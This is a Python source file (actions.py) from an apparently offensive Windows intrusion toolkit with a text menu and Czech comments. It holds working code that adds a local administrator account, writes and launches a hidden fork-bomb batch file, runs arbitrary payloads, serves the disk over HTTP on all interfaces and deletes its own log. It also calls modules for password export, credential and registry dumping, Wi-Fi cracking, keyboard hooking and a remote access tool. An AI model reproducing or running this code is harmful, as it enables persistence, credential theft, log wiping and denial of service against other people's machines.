# actions.py
import json
import os
import platform
import shutil
import socket
import subprocess
import tempfile
import time

from colorama import Fore

from config import BASE_DIR, RESULTS_DIR
from utils import clear

# modulova promenna - naplni action_scan
stored_system_info = None


# ============ pomocne ============

def _pause():
    input("Press Enter to continue...")
    clear()


def _local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        return s.getsockname()[0]
    finally:
        s.close()


def _ensure_results(*parts):
    p = os.path.join(RESULTS_DIR, *parts)
    os.makedirs(p, exist_ok=True)
    return p


# ============ System & Scan ============

def action_scan():
    global stored_system_info
    clear()
    print("System Information:")

    info = {
        "system": platform.system(),
        "node": platform.node(),
        "machine": platform.machine(),
        "platform_info": platform.platform(),
        "ip": _local_ip(),
    }
    for k, v in info.items():
        print(Fore.RED + f"{k}: {v}")
        time.sleep(0.1)

    stored_system_info = info

    out_dir = _ensure_results("Scan")
    with open(os.path.join(out_dir, "scan_results.json"), "w", encoding="utf-8") as f:
        json.dump(info, f, indent=4, ensure_ascii=False)

    _pause()


def action_result():
    if not stored_system_info:
        print("Scan nebyl proveden. Spust 'scan'.")
        time.sleep(3)
        return
    for k, v in stored_system_info.items():
        print(Fore.RED + f"{k}: {v}")
        time.sleep(0.1)
    _pause()


def action_addadmin():
    user = input("New admin username: ").strip()
    pw = input("New admin password: ").strip()
    subprocess.run(["net", "user", user, pw, "/add"], capture_output=True)
    subprocess.run(["net", "localgroup", "Administrators", user, "/add"],
                   capture_output=True)
    print(Fore.GREEN + f"[+] Created admin: {user}")
    _pause()


# ============ Utilities ============

def action_ftp():
    from modules import ftp
    ftp.run()
    _pause()


def action_ping():
    target = input("Target IP: ").strip()
    subprocess.run(["ping", target])
    _pause()


def action_diskfill():
    bat = os.path.join(BASE_DIR, "modules", "diskfiller.bat")
    subprocess.run([bat], shell=True)
    _pause()


def action_diskhost():
    subprocess.run("python -m http.server 8100 --bind 0.0.0.0", shell=True)


def action_passexport():
    from modules import passexport
    passexport.run()
    _pause()


def action_deletelog():
    import logging
    logging.shutdown()
    try:
        os.remove("logger.log")
        print("[+] logger.log smazan")
    except FileNotFoundError:
        print("[!] logger.log neexistuje")
    _pause()


def action_netscan():
    from modules import netscan
    netscan.run()
    _pause()


def action_allpass():
    from modules import allpass
    allpass.run()
    _pause()


def action_credscan():
    bat = os.path.join(BASE_DIR, "modules", "credscan.bat")
    subprocess.run([bat], shell=True)
    _pause()


def action_regsave():
    bat = os.path.join(BASE_DIR, "modules", "regsave.bat")
    subprocess.run([bat], shell=True)
    _pause()


# ============ Critical ============

def action_forkbomb():
    # FIX: Friend.bat v tempu, ne v CWD
    tmpdir = tempfile.mkdtemp(prefix="fork_")
    bat = os.path.join(tmpdir, "Friend.bat")

    with open(bat, "w", encoding="ascii") as f:
        f.write("@echo off\r\n:A\r\nstart %0\r\ngoto A\r\n")

    ps = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
    subprocess.run([
        ps, "-NoProfile", "-Command",
        f'Start-Process -FilePath "{bat}" -WindowStyle Hidden',
    ])
    print(Fore.RED + f"[!] Forkbomb spusten z {bat}")


def action_portopener():
    from modules import portopener
    portopener.run()
    _pause()


def action_packetcapture():
    from modules import packetcapture
    packetcapture.run()
    _pause()


def action_venom():
    path = input("Full path to payload: ").strip()
    if os.path.exists(path):
        subprocess.run([path], shell=True)
    else:
        print(Fore.RED + f"[!] Neexistuje: {path}")
    _pause()


def action_wificrack():
    from modules import wificrack
    wificrack.run()
    _pause()


def action_hook():
    from modules import hook
    hook.run()
    _pause()


# ============ Remote Access ============

def action_rat():
    from rat.menu import rat_menu
    rat_menu()


def action_ssh():
    from modules import ssh
    ssh.run()
    _pause()


# ============ Support ============

def action_help():
    print(Fore.YELLOW + "Available actions:")
    from menu import ACTIONS
    for key, (desc, _) in ACTIONS.items():
        print(f"  {key:<14} - {desc}")
    _pause()


def action_info():
    cmd = input("Info about which command?: ").strip().lower()
    from menu import ACTIONS
    entry = ACTIONS.get(cmd)
    if entry:
        print(f"{cmd}) {entry[0]}")
    else:
        print(f"Neznamy prikaz: {cmd}")
    _pause()


def action_cleanup():
    targets = {
        "a": "All",
        "r": "RegSave",
        "c": "CredScan",
        "w": "WifiCrack",
        "p": "PassExport",
        "n": "NetScan",
        "k": "PacketCapture",
        "l": "AllPass",
        "s": "Scan",
    }
    print("Smazat: [a]ll, [r]egsave, [c]redscan, [w]ifi, [p]assexport, "
          "[n]etscan, [k]packetcapture, a[l]lpass, [s]can")
    choice = input("Volba: ").strip().lower()

    if choice == "a":
        shutil.rmtree(RESULTS_DIR, ignore_errors=True)
        os.makedirs(RESULTS_DIR, exist_ok=True)
        print("[+] results/ smazano")
    elif choice in targets:
        target = os.path.join(RESULTS_DIR, targets[choice])
        shutil.rmtree(target, ignore_errors=True)
        print(f"[+] {target} smazano")
    else:
        print("[!] Neplatna volba")
    _pause()